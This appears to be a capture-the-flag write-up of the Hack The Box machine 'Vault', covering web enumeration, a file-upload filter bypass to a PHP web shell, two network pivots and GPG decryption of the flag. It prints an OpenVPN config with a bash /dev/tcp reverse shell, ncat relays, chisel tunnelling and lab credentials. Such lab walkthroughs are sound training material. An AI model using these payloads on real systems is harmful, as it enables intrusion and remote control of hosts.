---

title: "[MEDIUM] HTB-Vault"

draft: false

tags:

- pivoting

- openvpn

- chisel

- file-upload

- firewall-ev

- base32

- gpg

- web-shell

- linux

- htb

---

## Information Gathering
### Rustscan

Only two ports are open (**SSH** and **HTTP**) -> Classic HTB Linux machine:

```bash

┌──(yoon㉿kali)-[~/Documents/htb/vault]
└─$ rustscan --addresses 10.10.10.109 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------

😵 https://admin.tryhackme.com
[~] The config file is expected to be at "/home/yoon/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
<snip>
Host is up, received syn-ack (0.29s latency).
Scanned at 2024-03-15 06:38:02 EDT for 1s
  
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack
80/tcp open http syn-ack
<snip>
```

### Nmap

Nothing very new was found from nmap scan:

  

```bash

┌──(yoon㉿kali)-[~/Documents/htb/vault]
└─$ sudo nmap -sVC -p 22,80 10.10.10.109 -v
<snip>
Nmap scan report for 10.10.10.109 (10.10.10.109)
Host is up (0.42s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
| 256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_ 256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open http Apache httpd 2.4.18
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS

Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
<snip>
```

## Enumeration

### HTTP - TCP 80

I saw **Sparklays**, which I thought it as a potential username at first.

![](https://i.imgur.com/CIs3GzE.png)

### Feroxbuster on /

I first ran directory bruteforcing as I always do, but nothing showed up.

  

`sudo feroxbuster -u http://10.10.10.109 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

### Feroxbuster on /sparklays

Remembering on **Sparklays** being their first client, I tried accessing http://10.10.10.109/sparklays and it seemed that the page actually exists"

![](https://i.imgur.com/InNTnnF.png)

I ran directory bruteforcing on `/sparklays` and discovered:

  

- /sparklays/login.php

- /sparklays/admin.php

- /sparklays/design

### /sparklays/login.php

**Access denied** -> dead end.

![](https://i.imgur.com/DXds3Mw.png)

### /sparlays/design

**Forbidden** -> Moved on to later come back to further directory bruteforce on this directory.

![](https://i.imgur.com/pNBjapF.png)

### /sparklays/admin.php

I see a login page which I can try on bruteforcing or sql injection

![](https://i.imgur.com/OGYZRkI.png)

### sqlmap

I intercepted login attempt request with Burp Suite and saved it to req.txt and ran **sqlmap** with it but it seemed that it is not vulnerable to sql injection:

  

`sqlmap -r req.txt --batch

### Feroxbuster on /sparklays/design

Since I found admin.php unbreakable, I moved back to **/sparklays/design** and tried directory bruteforcing on it -> Discovered more paths!

  

`feroxbuster -u http://10.10.10.109/sparklays/design/ -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

![](https://i.imgur.com/HIOvDOX.png)

### /sparklays/design/design.html

Clicking on **Change Logo** led me to **changelogo.php**:

![](https://i.imgur.com/C2hWMdL.png)

### /sparklays/design/changelogo.php

Going to **changelogo.php**, I have a file upload page -> Very interesting.

At this point, I knew this is going to be my access point.

![](https://i.imgur.com/TZRaRm9.png)

## Shell as www-data

### File Uploads

I first uploaded random image and as I expected, I can access it from **/sparklays/design/uploads/whatever_name.jpg**

![](https://i.imgur.com/oBeLfFO.png)

### Checking allowed file extensions

To first see which file extensions are allowed, I tried uploading **test.php** -> not allowed : (

![](https://i.imgur.com/XqxhzcU.png)

**-Below are what process I went through until I got valid file extension-**

**test.phar** -> Not allowed.

**test.PhAr** -> not allowed.

**test.png.phar** -> Not allowed.

**test.png.phar%20** -> Not allowed.

test.php5 -> **Allowed!**

![](https://i.imgur.com/x5Br01e.png)

I can verify the file content on **/uploads/test.php5**:

![](https://i.imgur.com/Qd4Rwgf.png)

### p0wny-shell

I can upload simpler PHP shell but I always prefer something visually pretty.

[p0wny shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)is a perfect PHP shell that provides visuall shell in browser.

  

I uploaded downloaded p0wny shell with php5 extension and through **/uploads**, I have web shell as **www-data**:

![](https://i.imgur.com/YfdgfTA.png)

## Privesc www-data@ubuntu -> dave@ubuntu

sparklays-local-admin-interface-0001.php -> Looks interesting...

![](https://i.imgur.com/DZLnknL.png)

  

Opening **/sparklays/sparklays-local-admin-interface-0001.php** on browser, it gave me two options: **Server Settings** & **Design Settings**

![](https://i.imgur.com/JfZQPZ5.png)

Server Settings ->Under Construction.

![](https://i.imgur.com/GRW26BI.png)

Design Settings -> Led me to /sparklays/design/design.html(Same page that lead to changelogo.php)

### SSH as dave

**Servers**, **key**, **ssh** -> interesting!

![](https://i.imgur.com/pguWau9.png)

**Servers**: There seems to be other servers connected to this machine.

![](https://i.imgur.com/D73YKdR.png)

**key**: Currently, I didn't know what this key was for, but later it comes to use.

![](https://i.imgur.com/eyflMAZ.png)

**ssh**: This looks like ssh credentials for dave!

![](https://i.imgur.com/7q7Neab.png)

Using the found creds(dave:Dav3therav3123) from above, I can sign in to ssh as dave:

  

`ssh dave@10.10.10.109`

![](https://i.imgur.com/U51hEaW.png)

## Pivoting dave@ubuntu -> dave@DNS

Here is the [Pivoting Tutorial](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) that I found it really hand when solving this box.

### Host Discovery

Running **ifconfig**, I see a interface that seemed to be making connection to other machines.

**virbr0** -> new network!

  

`ifconfig`

![](https://i.imgur.com/lcWH1IP.png)

It is very likely that this open machines are **DNS + Configurator** and **Firewall** machines as I seen in the notes above, but I still continued with **Ping Sweep** to make it sure:

  

`time for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep "bytes from" &); done`

![](https://i.imgur.com/ZKP4fkU.png)

I found **192.168.122.4** and **192.168.122.5** as expected

### Port scanning

Before port forwarding, I would first discover open ports on discovered targets:

  

192.168.122.4 -> DNS + Configurator

192.168.122.5 -> Firewall

Normally, I can use commands such as below to perform full port scan without needing to install nmap on beachhead system:

  

`time for i in $(seq 1 65535); do (nc -zvn 192.168.122.5 ${i} 2>&1 | grep -v "Connection refused" &); done`

  

But this time I will first scan 1-100 ports to make it faster:

  

`nc -zv 192.168.122.4 1-100` -> port **80** open on **192.168.122.4**

![](https://i.imgur.com/CL6ibAi.png)

### Port Forwarding using Chisel

Now I will need to port-forward into **192.168.122.4:80** from **10.10.10.109 SSH**.

  

First uploaded **chisel** to beachhead system using Python http server and wget:

![](https://i.imgur.com/0fAnPB6.png)

Now on my local machine, I started on Chisel server listening on port 9000:

  

`chisel server -p 9000 --reverse`

![](https://i.imgur.com/4uyQZmM.png)

Now on beachhead system, I port forward 192.168.122.4's port 80 to Local Kali machine's port 9000:

  

`./chisel_linux client 10.10.14.18:9000 R:80:192.168.122.4:80`

![](https://i.imgur.com/HwaRpBY.png)

Going to 127.0.0.1:80 on local web browser, now I can access port 80 from 192.168.122.4:

![](https://i.imgur.com/n5nKS3t.png)

**dns-config.php** -> Not Found

**vpnconfig.php** -> VPN Configurator (Looks like RCE point to me!)

![](https://i.imgur.com/77cW1n5.png)

## OpenVPN RCE

Researching a bit on OpenVPN RCE, I came accross [this article](https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/).

  

Following the script from the above articles, I executed the command on VPN Configurator to spawn a shell successfully.

  

```bash
remote 192.168.122.1
dev tun
script-security 2
nobind
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0<&1 2>&1&'"
```

![](https://i.imgur.com/fXuBzcO.png)

I had netcat listener running on **dave@ubuntu**(10.10.10.109), and now I have reverse shell connection to **root@DNS**(192.168.122.4):

  

`nc -lvnp 1337`

![](https://i.imgur.com/JqHCZEP.png)

### SSH as dave@DNS

Looking around the file system, I discovered: **user.txt** and **ssh**:

![](https://i.imgur.com/ig0MePo.png)

SSH file had a dave's creds to SSH:(**dave:dav3gerous567**)

![](https://i.imgur.com/qEU4GZV.png)

With the SSH creds found above -> SSHed in to **dave@DNS** from **dave@ubuntu**

![](https://i.imgur.com/zDjomyo.png)

## Privesc dave@DNS -> root@DNS

Earlier on OpenVPN RCE shell, I had connection as root but here connection was made a dave.

  

Checking on what commands I can run as root, It turns out I can run any commands as root:

`sudo -l`

![](https://i.imgur.com/6jV8iIY.png)

I can easily reach root privilege as such:

  

`sudo su`

![](https://i.imgur.com/l9BhgOq.png)

## Pivoting dave@DNS -> dave@vault

### Local Enumeration

At this point, I was expected to find root.txt but it seemed that I need to work on more escalation.

  

Going through my privilege escalation methodology, I discovered IP address for the **Vault**"

  

`cat /etc/hosts`

![](https://i.imgur.com/XnKRwPv.png)

Also, checking on ales'x bash history, I discovered him pinging 192.168.5.2 which was noted as the Vault above:

  

`cat /home/alex/.bash_history`

![](https://i.imgur.com/VpQBLIF.png)

Now I realized this is where I need to pivot once more into the **Vault**(192.168.5.2).

  

I looked for **192.168.5.2** on log files and auth.log and btmp had a match:

  

`grep -r "192.168.5.2" /var/log`

![](https://i.imgur.com/qsCYp16.png)

Reading the log file, it seemed to be SSH authentication related history from dave@ubuntu to the Vault:

  

`cat /var/log/auth.log | grep -a '192.168.5.2'`

![](https://i.imgur.com/kGfJTdg.png)

Some of the lines were extra interesting:

- Seemed that there is nmap installed on dave@DNS

- When scanning the Vault with nmap, they used port 4444 as a source port

![](https://i.imgur.com/gZlmYUC.png)

The source-port option allows you to specify a custom source port for the outgoing packets. This can be useful for various purposes, such as bypassing firewall rules or network filtering that might block traffic from certain ports.

### Vault Enumeration

Now as seen from the log file above, I tried scanning the Vault(192.168.5.2) with nmap.

  

First I tired scanning without the source port to see what happens and as expected it shows ports are closed:

  

`nmap 192.168.5.2 -Pn -f`

![](https://i.imgur.com/ylSsfj0.png)

This time I tried running the scan with the source port as 4444 and now it shows port 987 open!

  

`nmap 192.168.5.2 -Pn -f --source-port=4444`

![](https://i.imgur.com/BHjVQLR.png)

### SSH as dave@vault

Now I know that the Vault is connected to dave@ubuntu with the IP address of 192.168.5.2 and had port 987 open with source port 4444.

  

I have to port forward port 987 back to me but from what I know SSH port forwarding or Chisel port forwarding has no option to set the source port.

  

Reading the log file more thoroughly, I discovered lines that provides answer to me for this issue:

  

```bash
/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

  

In summary, this command sets up a listening server on port 1234. When a connection is made to this port, it executes another ncat command to connect to the IP address 192.168.5.2 on port 987, effectively creating a reverse shell.

  

I first started ncat listener in the background:

  

`/usr/bin/ncat -l 1337 --sh-exec "ncat 192.168.5.2 987 -p 53" &`

![](https://i.imgur.com/EAtWq9r.png)

With the listner running, I made ssh connection to the listener:

  

`ssh dave@localhost -p 1337`

![](https://i.imgur.com/wu87s1z.png)

Now I have SSH connection to **dave@vault**!

### rbash escape

I tried moving to different directories and it was restricted due to **rbash**:

  

![](https://i.imgur.com/400JPZK.png)

I can easily bypass this by appending `-t bash` at the end of the command as such:

`ssh dave@localhost -p 1337 -t bash`

![](https://i.imgur.com/EMIi2iq.png)

## root.txt.gpg decrypt

Looking around the file system, I found **root.txt.gpg** which seemed like an end goal for this box:

![](https://i.imgur.com/jBnpVzZ.png)

I first tried decrypting on **dave@vault** but secret key wasn't available on this system:

  

`gpg -d root.txt.gpg`

![](https://i.imgur.com/JPqQUB3.png)

In order to transfer file to different systems, I tried base64 but sadly it wasn't installed on dave@vault:

  

`base64 root.txt.gpg`

![](https://i.imgur.com/kB1jsfZ.png)

Luckily, base32 was installed:

  

`base32 -w0 root.txt.gpg`

![](https://i.imgur.com/T3BM0Dk.png)

Now I moved back to **dave@DNS** and transferred the gpg file using base32:

  

`echo QUBAY<snip>RI7XY= | base32 -d > a.gpg`

![](https://i.imgur.com/gTPZvQK.png)

I tried decrypting both as **dave@DNS** and **root@DNS** but both didn't workout:

  

![](https://i.imgur.com/Mwv4aqu.png)

Using base32, I moved the gpg file to **dave@ubuntu**.

  

Remembering the key from earlier: **itscominghome**, I decrypted the file to obtain root.txt:

![](https://i.imgur.com/0gX3cJI.png)

## Summary

This machine required two pivoting in total:

- dave@ubuntu -> dave@DNS

- dave@DNS -> dave@vault

  

Major steps of the box:

- Feroxbuster -> **design.html**

- Filter bypass -> **p0wny Shell**

- Get creds -> SSH **dave@ubuntu

- OpenVPN Exec -> RCE **root@DNS**

- Get creds -> SSH **dave@DNS**

- sudo -l -> Privesc **root@DNS

- Source port -> SSH **dave@vault**

- Get **root.txt.gpg**

- Decrypt! -> root.txt